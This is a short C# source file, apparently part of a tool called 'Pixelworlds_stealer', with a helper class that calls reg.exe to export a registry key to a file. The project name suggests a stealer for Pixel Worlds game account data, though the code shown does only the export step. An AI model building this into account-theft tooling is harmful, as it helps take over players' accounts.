using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Pixelworlds_stealer
{
    internal class reg
    {
         public static void ExportKey(string RegKey, string SavePath)
        {

            Process.Start("reg.exe", "/e " + SavePath + " " + RegKey + "");
        }
    }
}
